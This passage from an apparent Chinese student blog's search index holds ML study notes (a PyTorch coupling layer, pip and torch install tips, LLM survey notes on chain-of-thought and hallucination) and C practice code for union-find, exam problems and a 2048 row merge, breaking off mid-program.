= (x.narrow(<span class="number">1</span>, <span class="number">0</span>, self.split_len1),</span><br><span class="line">                  x.narrow(<span class="number">1</span>, self.split_len1, self.split_len2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rev: <span class="comment"># rev 反转，解码网络部分</span></span><br><span class="line"></span><br><span class="line">            t2 = self.f(x2)</span><br><span class="line">            y1 = x1 + t2</span><br><span class="line">            s1, t1 = self.r(y1), self.y(y1)</span><br><span class="line">            y2 = self.e(s1) * x2 + t1</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            s1, t1 = self.r(x1), self.y(x1)</span><br><span class="line">            y2 = (x2 - t1) / self.e(s1)</span><br><span class="line">            t2 = self.f(y2)</span><br><span class="line">            y1 = (x1 - t2)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> torch.cat((y1, y2), <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/read-papers-in-shixi/image-20230327152145155.png" alt="image-20230327152145155"></p><h1 id="error-subprocess-exited-with-error错误解决方案，即pip-安装第三方包问题"><a href="#error-subprocess-exited-with-error错误解决方案，即pip-安装第三方包问题" class="headerlink" title="error: subprocess-exited-with-error错误解决方案，即pip 安装第三方包问题"></a>error: subprocess-exited-with-error错误解决方案，即pip 安装第三方包问题</h1><p>有些说是pip版本不对</p><p>实际上，安装不上包的原因有很多，这次是因为内存不足，无法安装造成的报错，删除一些不用的包或者不用的大文件即可</p><h1 id="安装torch脚本（重要）"><a href="#安装torch脚本（重要）" class="headerlink" title="安装torch脚本（重要）"></a>安装torch脚本（重要）</h1><ul><li>注意不要漏打</li></ul><ul><li>python 版本 应该高点，3.10左右吧，pip install torch&#x3D;&#x3D;1.12.1+cu116 torchvision&#x3D;&#x3D;0.13.1+cu116 –extra-index-url <a href="https://download.pytorch.org/whl/cu116">https://download.pytorch.org/whl/cu116</a></li></ul><ul><li>python&#x3D;&#x3D;3.8,pip install torch&#x3D;&#x3D;1.8.1+cu101 torchvision&#x3D;&#x3D;0.9.1+cu101  –extra-index-url <a href="https://download.pytorch.org/whl/cu101">https://download.pytorch.org/whl/cu101</a></li><li><a href="https://download.pytorch.org/whl/cu117%E8%AF%A6%E8%A7%81">https://download.pytorch.org/whl/cu117详见</a></li></ul><h1 id="生成requirements-txt"><a href="#生成requirements-txt" class="headerlink" title="生成requirements.txt"></a>生成requirements.txt</h1><blockquote><p>pip install pipreqs</p><p>pipreqs .</p><p> 或限定编码方式为utf8，否则会有编码错误error</p><p>pipreqs .&#x2F; –encoding&#x3D;utf8</p></blockquote><h1 id="A-Survey-of-Large-Language-Models"><a href="#A-Survey-of-Large-Language-Models" class="headerlink" title="A Survey of Large Language Models"></a>A Survey of Large Language Models</h1><p>三步：pre-training ,adaptation tuning,design suitable prompting strategies</p><p>即：预训练，调优，和提示策略</p><h2 id="调优"><a href="#调优" class="headerlink" title="调优"></a>调优</h2><p>RLHF系统主要由三个关键部分组成：预先训练好的LM，从人类反馈中学习的奖励模型，以及训练LM的RL算法（RL强化学习）</p><h3 id="提示策略"><a href="#提示策略" class="headerlink" title="提示策略"></a>提示策略</h3><ul><li><strong>in-context learning</strong></li></ul><p>ICL：上下文学习in-context learning</p><p>ICL用一个自然语言描述、几个演示程序和一个测试查询来提示llm。</p><h2 id="CoT"><a href="#CoT" class="headerlink" title="CoT"></a><strong>CoT</strong></h2><ul><li><strong>Chain-of-Thought Prompting</strong>（CoT）</li></ul><p>CoT提示则涉及到提示中的一系列中间推理步骤。</p><blockquote><p>推理步骤：</p><p>If a rectangle has a length of 6 cm and a width of 3 cm, </p><p>what is the perimeter of the rectangle?</p><p>For a rectangle, add up the length and width and double it. </p><p>So, the perimeter of this rectangle is (6 + 3) x 2 &#x3D; 18 cm.</p></blockquote><h2 id="改进CoT"><a href="#改进CoT" class="headerlink" title="改进CoT"></a>改进CoT</h2><ul><li><strong>Few-shot CoT.</strong></li></ul><p><em><strong>Enhanced CoT strategies</strong></em></p><p><strong>自一致性策略</strong></p><p>作为改进的CoT策略，生成多个推理路径，所有推理结果获得一个集合，投票决定</p><ul><li><strong>Zero-shot CoT.</strong></li></ul><p>零镜头CoT在提示中不包含人工注释的任务演示。相反，它直接生成推理步骤，然后使用生成的cot来推导答案。</p><p><strong>模型专门化</strong></p><blockquote><p> In addition to directly utilizing LLMs with ICL and CoT, some recent studies explore how to specialize the ability of LLMs towards specifific tasks [255–257], which is called <em>model specialization</em> [258]. For example, the researchers in [258] specialize the ability of mathematical reasoning from LLMs through fifine-tuning the small-scale Flan-T5 [81] on CoT reasoning paths generated by LLMs. Model specialization can also be applied to solve a variety of tasks like question answering [259], code synthesis [260], and information retrieval [261].</p></blockquote><p>模型专门化是本次任务的重点，相对于一种通用的LLM模型,应当获取一个应用于特定领域的语音模型</p><h2 id="现有语音模型任务"><a href="#现有语音模型任务" class="headerlink" title="现有语音模型任务"></a>现有语音模型任务</h2><p>现有的语言生成任务大致可以分为语言建模任务、条件文本生成任务和代码合成任务。</p><h2 id="LLM使用知识-Knowledge-Utilization"><a href="#LLM使用知识-Knowledge-Utilization" class="headerlink" title="LLM使用知识  Knowledge Utilization"></a>LLM使用知识  <em>Knowledge Utilization</em></h2><h3 id="Closed-Book-QA"><a href="#Closed-Book-QA" class="headerlink" title="Closed-Book QA"></a><strong>Closed-Book QA</strong></h3><p>闭卷问答</p><p>只能使用train前用于训练的基础知识，如自然问题[283]、Web问题[286]和TriviaQA [287]</p><p>只能根据上下文回答</p><h3 id="open-Book-QA"><a href="#open-Book-QA" class="headerlink" title="open-Book QA"></a><strong>open-Book QA</strong></h3><p>开卷问答</p><p>回答过程是可以联网的</p><p>open-book QA数据集（例如，自然问题[283]、OpenBookQA [295]和SQuAD [298]）与封闭书QA数据集有重叠，但它们包含了外部数据源，例如，维基百科</p><h3 id="Knowledge-Completion"><a href="#Knowledge-Completion" class="headerlink" title="Knowledge Completion."></a><strong>Knowledge Completion.</strong></h3><h2 id="问题：-Hallucination-（幻觉产生）"><a href="#问题：-Hallucination-（幻觉产生）" class="headerlink" title="问题： Hallucination  （幻觉产生）"></a>问题： <em>Hallucination</em>  （幻觉产生）</h2><ul><li><p>就是LLM模型骗人，胡乱生成回答内容。在所有的LLM模型中都存在</p></li><li><p>本质上讲，llm似乎是“无意识地”利用知识来解决任务，而这仍然缺乏准确控制内在或外部知识使用的能力</p></li><li><p>评估幻觉问题，人们提出了一组幻觉检测任务，如真实QA[285]，用于检测被模型模拟的人类谎言</p></li></ul><h2 id="问题：Knowledge-recency（知识更新）"><a href="#问题：Knowledge-recency（知识更新）" class="headerlink" title="问题：Knowledge recency（知识更新）"></a>问题：<em>Knowledge recency</em>（知识更新）</h2><p>新的知识和重新训练过程中的灾难性遗忘问题</p><p>通过外接搜索引擎可以缓解这个问题</p><h2 id="复杂推理"><a href="#复杂推理" class="headerlink" title="复杂推理"></a>复杂推理</h2><p>复杂推理是指理解和利用支持证据或逻辑得出结论或做出决策的能力。根据推理过程中所涉及的逻辑和证据的类型，我们考虑将现有的评价任务分为知识推理、符号推理和数学推理三类</p><h3 id="知识推理"><a href="#知识推理" class="headerlink" title="知识推理"></a>知识推理</h3><p>LLMs may have diffificulty in explicitly inferring the commonsense knowledge required by a specifific task, though they can successfully solve it.</p><h3 id="符号推理"><a href="#符号推理" class="headerlink" title="符号推理"></a>符号推理</h3><h3 id="数学推理"><a href="#数学推理" class="headerlink" title="数学推理"></a>数学推理</h3><h1 id="VITS"><a href="#VITS" class="headerlink" title="VITS"></a>VITS</h1>]]></content>
      
      
      <categories>
          
          <category> AI，信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c 语言</title>
      <link href="/2023/04/02/C/"/>
      <url>/2023/04/02/C/</url>
      
        <content type="html"><![CDATA[<p>咱又开始复习c语言哩，历史是个循环呢。</p><h1 id="集合表示方法"><a href="#集合表示方法" class="headerlink" title="集合表示方法"></a>集合表示方法</h1><p>没有优化过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> find[<span class="number">100000</span>];  <span class="comment">// find[] is a global variabel,it is union,or in C  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_father</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(find[a]==a)&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> get_father(find[a]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">find[a] = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">find[i]=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="复试机试模拟"><a href="#复试机试模拟" class="headerlink" title="复试机试模拟"></a>复试机试模拟</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a,<span class="type">const</span> <span class="type">void</span> *b)</span>&#123;</span><br><span class="line"><span class="comment">// qsort  compare function </span></span><br><span class="line"><span class="keyword">return</span> *(<span class="type">char</span> *)a-*(<span class="type">char</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//int flag[1000000]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">//char ss[1000000];</span></span><br><span class="line"><span class="type">int</span> find[<span class="number">100000</span>];  <span class="comment">// find[] is a global variabel,it is union,or in C  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_father</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(find[a]==a)&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> get_father(find[a]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">find[a] = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">find[i]=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="type">int</span> T;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T);</span><br><span class="line"><span class="keyword">while</span>(T--)&#123;</span><br><span class="line"><span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">init(n);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">int</span> a,b;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">merge(a,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(find[i]==i)&#123;</span><br><span class="line">num++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main5</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> T;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T);</span><br><span class="line"><span class="keyword">while</span>(T!=<span class="number">0</span>)&#123;</span><br><span class="line">T--;</span><br><span class="line"><span class="type">int</span> x1, y1, x2, y2, x3, y3;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d %d %d&quot;</span>,&amp;x1,&amp;y1,&amp;x2,&amp;y2, &amp;x3, &amp;y3);</span><br><span class="line"><span class="comment">// L1=CA</span></span><br><span class="line"><span class="comment">// L2=CB</span></span><br><span class="line"><span class="type">float</span> t = (x3-x1)*(x3-x2)+(y3-y1)*(y3-y2);</span><br><span class="line"><span class="comment">//(x3-x1,y3-y1)  (x3-x2,y3-y2)</span></span><br><span class="line"><span class="keyword">if</span>(t&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Acute&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Right&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(t&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Obtuse&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main4</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">128</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//printf(&quot;%d\n&quot;,toascii(&#x27;a&#x27;)); // 需要用到#include &lt;ctype.h&gt;函数库</span></span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="type">char</span> s1[<span class="number">1000</span>];</span><br><span class="line"><span class="type">char</span> s2[<span class="number">1000</span>];</span><br><span class="line">gets(s1);</span><br><span class="line">gets(s2);</span><br><span class="line"><span class="type">int</span> flag=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">for</span>(i =<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s2);i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s2[i]&gt;=<span class="number">65</span>&amp;&amp;s2[i]&lt;=<span class="number">91</span>)&#123;</span><br><span class="line">a[toascii(s2[i])+<span class="number">32</span>]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a[toascii(s2[i])]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s1);i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s1[i]&gt;=<span class="number">65</span>&amp;&amp;s1[i]&lt;=<span class="number">91</span>)&#123;  <span class="comment">//大写字母 </span></span><br><span class="line"><span class="keyword">if</span>( a[toascii(s1[i])+<span class="number">32</span>]!=<span class="number">1</span>)&#123; </span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s1[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a[toascii(s1[i])]!=<span class="number">1</span>)&#123;</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s1[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Blank&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> sss[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">while</span>(gets(sss))&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="type">char</span> t;</span><br><span class="line">qsort(sss,<span class="built_in">strlen</span>(sss),<span class="keyword">sizeof</span>(sss[<span class="number">0</span>]),cmp);</span><br><span class="line"><span class="comment">// qsort(??????????????????????????С????????)?? </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(sss);i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="built_in">strlen</span>(sss))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,sss[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,sss[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="type">int</span> t=<span class="number">0</span>;<span class="comment">//t??? ??? </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n-i<span class="number">-1</span>;j++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,<span class="string">&#x27;A&#x27;</span>+(t%<span class="number">26</span>));</span><br><span class="line">t++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x,y,n;</span><br><span class="line"><span class="type">int</span> T;</span><br><span class="line"><span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T);</span><br><span class="line"><span class="keyword">while</span>(T!=<span class="number">0</span>)&#123;</span><br><span class="line">T--;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">flag =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(x=<span class="number">1</span>;x&lt;=<span class="number">100</span>;x++)&#123;</span><br><span class="line"><span class="keyword">for</span>(y=x;y&lt;=<span class="number">100</span>;y++)&#123;</span><br><span class="line"><span class="keyword">if</span>(x*x*x+y*y*y==n)&#123;</span><br><span class="line">flag =<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,x,y);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No Solution\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p>铁定是垃圾网站的的问题才ac不了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="type">int</span> a[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> flag[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">flag[i]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">3</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i]==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=i;j&gt;<span class="number">0</span>;j--)&#123;</span><br><span class="line">a[j]=a[j<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">3</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]==<span class="number">1</span>&amp;&amp;a[i]==a[i<span class="number">-1</span>])&#123;</span><br><span class="line">a[i] = a[i]*<span class="number">2</span>;</span><br><span class="line">a[i<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">flag[i<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">3</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i]==<span class="number">0</span>||flag[i]==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=i;j&gt;<span class="number">0</span>;j--)&#123;</span><br><span class="line">a[j]=a[j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span 